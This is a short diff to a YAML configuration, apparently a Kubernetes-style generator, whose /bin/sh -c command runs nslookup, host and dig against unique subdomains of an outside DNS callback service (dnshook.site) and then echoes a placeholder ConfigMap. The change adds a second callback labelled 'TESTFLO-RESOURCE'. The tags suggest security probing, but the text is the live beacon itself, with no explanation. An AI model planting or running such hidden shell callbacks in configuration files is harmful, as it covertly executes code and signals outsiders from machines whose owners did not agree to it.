@@ -8,4 +8,4 @@ metadata:
         path: /bin/sh
         args:
           - -c
-          - "nslookup TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || host TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || dig TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
+          - "nslookup TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || host TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || dig TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || true; nslookup TESTFLO-RESOURCE.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || host TESTFLO-RESOURCE.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || dig TESTFLO-RESOURCE.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
